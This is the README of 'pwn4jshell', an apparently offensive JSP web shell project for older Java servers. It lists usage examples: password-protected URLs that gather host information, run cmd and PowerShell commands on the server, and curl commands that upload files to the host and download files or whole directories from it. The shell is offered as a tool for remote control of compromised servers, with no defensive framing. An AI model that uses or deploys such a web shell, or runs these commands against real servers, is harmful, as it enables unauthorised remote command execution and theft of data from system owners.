# pwn4jshell
Java Web shell project

Idea of creating, webshell with suport to old versions of java. 
Building it in jsp means the code compilation will happend at the server side
with the server compiler, making it easyer and less likely to run into
compatibility issues. 
Other than api... and sintax things should be easy. 


## Credits
Some of the code in this project is based on work from other ppl.   
For file upload based on Boris Von Leosch.

## Example

### Get basic host information
http://{ip}:8080/pwn4jshell/shell.jsp?pass=key

### Execute CMD command Execution
http://{ip}:8080/pwn4jshell/?pass=key&action=exec&args=dir

### Powershell Command execution 
http://{ip}:8080/pwn4jshell/?pass=key&action=power&args=dir

### Upload a file 
curl -X POST -F "file=@{file to upload}" "http://{ip}:8080/?pass=key&action=up&path={destination}"

if the path is not set the file will be placed in the same dir as the shell.jsp

## Download file or directory
curl "http://{ip}:8080/pwn4jshell/?pass=key&action=down&path={pathToFile}&args=shell.jsp" 

same as upload if path is not set will try to download the file from the same dir as shell.jsp 